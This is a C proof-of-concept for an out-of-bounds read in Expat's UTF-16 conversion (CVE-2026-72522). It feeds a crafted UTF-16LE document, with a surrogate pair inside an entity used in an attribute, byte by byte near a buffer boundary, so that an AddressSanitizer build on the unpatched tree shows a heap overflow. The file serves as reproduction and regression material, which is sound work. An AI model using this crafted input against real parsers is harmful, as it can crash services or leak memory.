/* Residual PoC for CVE-2026-72522 (OOB read in *_toUtf16).
 *
 * Drives the public Expat API (XML_Parse) with in-contract input: a
 * well-formed UTF-16LE document whose only crafted aspect is the astral
 * character carried inside an internal general entity referenced from an
 * attribute value.  The character is U+10000 (surrogate pair D800 DC00);
 * the trailing low surrogate has high byte 0xDC.
 *
 * On a tree where *_toUtf16 correctly classifies only 0xD8..0xDB as a high
 * surrogate (the upstream fix), the low surrogate is copied normally and the
 * parse completes.  On the shipped tree the trailing low surrogate 0xDCxx is
 * still mistaken for the first half of a surrogate pair and held back, which
 * drives an out-of-bounds read of the entity value buffer.
 *
 * Build (16-bit XML_Char) with AddressSanitizer and run; it aborts with a
 * heap-buffer-overflow in little2_toUtf16 on the shipped tree only.
 */
#include <stdio.h>
#include "expat.h"

/* Feed bytes one at a time, mirroring the project's _XML_Parse_SINGLE_BYTES
 * test helper with its default chunk size of 1. */
static int
feed(XML_Parser p, const char *s, int len, int isFinal) {
  for (; len > 1; len--, s++) {
    if (XML_Parse(p, s, 1, XML_FALSE) == XML_STATUS_ERROR)
      return 0;
  }
  return XML_Parse(p, s, len, isFinal) != XML_STATUS_ERROR;
}

int
main(void) {
  /* UTF-16LE: <!DOCTYPE d [ <!ENTITY e ' */
  const char doc_before[] = "<\0!\0D\0O\0C\0T\0Y\0P\0E\0 \0d\0 \0[\0\n\0"
                            " \0 \0<\0!\0E\0N\0T\0I\0T\0Y\0 \0e\0 \0'\0";
  /* UTF-16LE: '>\n]>\n<r a='&e;'/>\n */
  const char doc_after[] = "'\0>\0\n\0]\0>\0\n\0"
                           "<\0r\0 \0a\0=\0'\0&\0e\0;\0'\0/\0>\0\n\0";
  /* UTF-16LE of U+10000 -> high surrogate D800, low surrogate DC00 */
  const char surrogate_pair[] = "\x00\xd8\x00\xdc";

  for (size_t i = 1021; i <= 1025; i++) {
    XML_Parser parser = XML_ParserCreate(NULL);
    if (parser == NULL)
      return 2;

    if (! feed(parser, doc_before, (int)sizeof(doc_before) - 1, XML_FALSE)) {
      XML_ParserFree(parser);
      continue;
    }
    int ok = 1;
    for (size_t j = 0; j < i; j++) {
      if (! feed(parser, "a\0", 2, XML_FALSE)) {
        ok = 0;
        break;
      }
    }
    if (ok)
      feed(parser, surrogate_pair, 4, XML_FALSE);
    if (ok)
      feed(parser, doc_after, (int)sizeof(doc_after) - 1, XML_TRUE);

    XML_ParserFree(parser);
  }

  printf("completed without fault\n");
  return 0;
}
